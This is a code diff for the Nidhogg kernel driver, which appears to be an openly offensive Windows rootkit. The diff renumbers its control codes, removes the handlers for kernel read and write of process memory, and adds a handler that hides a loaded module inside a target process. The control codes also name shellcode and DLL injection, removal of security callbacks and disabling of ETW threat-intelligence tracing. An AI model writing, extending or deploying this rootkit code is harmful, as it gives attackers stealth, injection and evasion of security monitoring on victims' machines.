@@ -27,17 +27,16 @@
 #define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_HIDE_MODULE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -777,83 +776,40 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_NIDHOGG_WRITE_DATA:
+	case IOCTL_NIDHOGG_HIDE_MODULE:
 	{
-		PEPROCESS TargetProcess;
-
-		if (!Features.WriteData) {
-			KdPrint((DRIVER_PREFIX "Due to previous error, write data feature is unavaliable.\n"));
+		if (!Features.ModuleHiding) {
+			KdPrint((DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(PkgReadWriteData) != 0) {
+		if (size % sizeof(HiddenModuleInformation) != 0) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = (PkgReadWriteData*)Irp->AssociatedIrp.SystemBuffer;
+		auto data = (HiddenModuleInformation*)Irp->AssociatedIrp.SystemBuffer;
 
-		if (data->LocalAddress == 0 || data->RemoteAddress == 0 || data->Pid <= 0 || data->Size <= 0) {
+		if (!data->ModuleName || data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID) {
 			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = PsLookupProcessByProcessId((HANDLE)data->Pid, &TargetProcess);
+		status = NidhoggMemoryUtils->HideModule(data);
 
-		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "Failed to get process.\n"));
-			break;
+		if (NT_SUCCESS(status)) {
+			auto prevIrql = KeGetCurrentIrql();
+			KeLowerIrql(PASSIVE_LEVEL);
+			KdPrint((DRIVER_PREFIX "Hid module %ws for process %d.\n", (*data).ModuleName, data->Pid));
+			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
-		status = NidhoggMemoryUtils->KeWriteProcessMemory(data->LocalAddress, TargetProcess, data->RemoteAddress, data->Size, data->Mode);
-
-		ObDereferenceObject(TargetProcess);
-		len += sizeof(PkgReadWriteData);
-		break;
-	}
-
-	case IOCTL_NIDHOGG_READ_DATA:
-	{
-		PEPROCESS Process;
-
-		if (!Features.ReadData) {
-			KdPrint((DRIVER_PREFIX "Due to previous error, read data feature is unavaliable.\n"));
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-
-		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
-
-		if (size % sizeof(PkgReadWriteData) != 0) {
-			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
-			status = STATUS_INVALID_BUFFER_SIZE;
-			break;
-		}
-
-		auto data = (PkgReadWriteData*)Irp->AssociatedIrp.SystemBuffer;
-
-		if (data->LocalAddress == 0 || data->RemoteAddress == 0 || data->Pid <= 0 || data->Size <= 0) {
-			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
-		status = PsLookupProcessByProcessId((HANDLE)data->Pid, &Process);
-
-		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "Failed to get process.\n"));
-			break;
-		}
-
-		status = NidhoggMemoryUtils->KeReadProcessMemory(Process, data->RemoteAddress, data->LocalAddress, data->Size, data->Mode);
-
-		ObDereferenceObject(Process);
-		len += sizeof(PkgReadWriteData);
+		len += sizeof(HiddenModuleInformation);
 		break;
 	}
 
